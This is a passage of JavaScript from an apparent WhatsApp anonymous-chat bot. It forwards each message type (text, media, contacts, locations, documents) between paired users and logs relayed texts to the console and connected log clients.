               } else if (type == 'locationMessage') {
                    if (mediaData.message.locationMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.locationMessage, 'locationMessage', { quoted: { message: mediaData.message.locationMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.locationMessage, 'locationMessage')
               } else if (type == 'liveLocationMessage') {
                    if (mediaData.message.liveLocationMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.liveLocationMessage, 'liveLocationMessage', { quoted: { message: mediaData.message.liveLocationMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.liveLocationMessage, 'liveLocationMessage')
               } else if (type == 'documentMessage') {
                    if (mediaData.message.documentMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, 'documentMessage', { mimetype: mediaData.message.documentMessage.mimetype, filename: mediaData.message.documentMessage.title, quoted: { message: mediaData.message.documentMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, 'documentMessage', { mimetype: mediaData.message.documentMessage.mimetype, filename: mediaData.message.documentMessage.title })
               } else if (type == 'productMessage') {
                    if (mediaData.message.stickerMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.productMessage, 'productMessage', { quoted: { message: mediaData.message.productMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.productMessage, 'productMessage')
               } else if (type == 'contactsArrayMessage') {
                    if (mediaData.message.contactsArrayMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.contactsArrayMessage, 'contactsArrayMessage', { quoted: { message: mediaData.message.contactsArrayMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.contactsArrayMessage, 'contactsArrayMessage')
               } else if (type === 'extendedTextMessage') {
                    let quoted = hurtz.message.extendedTextMessage.contextInfo ? mediaData : {}
                    conn.sendMessage(targetChat, body, MessageType.text, { quoted: { ...quoted, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
               }
          } else if (user2.includes(sender)) {
               const indexSender = db_user.findIndex(i => i.client2 == sender)
               const targetChat = db_user[indexSender].client1
               if (targetChat == null) return
               if (commandList.includes(body.slice(1))) return
               const teks = chalk.bgCyanBright('[ ANCHT ]') + '  ' + time + ' ' + chalk.greenBright(body) + " dari " + chalk.greenBright(pushname.split('\n')[0])
               console.log(teks);
               clientsNow.forEach((client) => {
                    if (!isClientLog) return
                    client.send(teks)
               });
               if (type == 'conversation') {
                    balasNp(targetChat, body)
               } else if (type == 'stickerMessage') {
                    if (mediaData.message.stickerMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.sticker, { quoted: { message: mediaData.message.stickerMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.sticker)
               } else if (type == 'imageMessage') {
                    if (mediaData.message.imageMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.image, { caption: body ? body : '', quoted: { message: mediaData.message.imageMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.image, { caption: body ? body : '' })
               } else if (type == 'audioMessage') {
                    if (mediaData.message.audioMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.audio, { quoted: { message: mediaData.message.audioMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.audio, { caption: '', ptt: mediaData.message.audioMessage.ptt })
               } else if (type == 'videoMessage') {
                    if (mediaData.message.videoMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, MessageType.video, { caption: body ? body : '', quoted: { message: mediaData.message.videoMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, MessageType.video, { caption: body ? body : '' })
               } else if (type == 'contactMessage') {
                    if (mediaData.message.contactMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.contactMessage, 'contactMessage', { quoted: { message: mediaData.message.contactMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.contactMessage, 'contactMessage')
               } else if (type == 'locationMessage') {
                    if (mediaData.message.locationMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.locationMessage, 'locationMessage', { quoted: { message: mediaData.message.locationMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.locationMessage, 'locationMessage')
               } else if (type == 'liveLocationMessage') {
                    if (mediaData.message.liveLocationMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.liveLocationMessage, 'liveLocationMessage', { quoted: { message: mediaData.message.liveLocationMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.liveLocationMessage, 'liveLocationMessage')
               } else if (type == 'documentMessage') {
                    if (mediaData.message.documentMessage.contextInfo) {
                         const buff = await conn.downloadMediaMessage(mediaData)
                         conn.sendMessage(targetChat, buff, 'documentMessage', { mimetype: mediaData.message.documentMessage.mimetype, filename: mediaData.message.documentMessage.title, quoted: { message: mediaData.message.documentMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    const buff = await conn.downloadMediaMessage(mediaData)
                    conn.sendMessage(targetChat, buff, 'documentMessage', { mimetype: mediaData.message.documentMessage.mimetype, filename: mediaData.message.documentMessage.title })
               } else if (type == 'productMessage') {
                    if (mediaData.message.stickerMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.productMessage, 'productMessage', { quoted: { message: mediaData.message.productMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.productMessage, 'productMessage')
               } else if (type == 'contactsArrayMessage') {
                    if (mediaData.message.contactsArrayMessage.contextInfo) {
                         conn.sendMessage(targetChat, mediaData.message.contactsArrayMessage, 'contactsArrayMessage', { quoted: { message: mediaData.message.contactsArrayMessage.contextInfo.quotedMessage, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
                         return
                    }
                    conn.sendMessage(targetChat, mediaData.message.contactsArrayMessage, 'contactsArrayMessage')
               } else if (type === 'extendedTextMessage') {
                    let quoted = hurtz.message.extendedTextMessage.contextInfo ? mediaData : {}
                    conn.sendMessage(targetChat, body, MessageType.text, { quoted: { ...quoted, key: { fromMe: true, credit: 'AnonChat By MRHRTZ' } } })
               }
          }


          /*-----------------[ End Of Handler ]------------------*/
     } catch (error) {
          console.log(error)
          clientsNow.forEach((client) => {
               if (!isClientLog) return
               client.send(chalk.red('ERR : ') + util.format(error))
          });
     }
};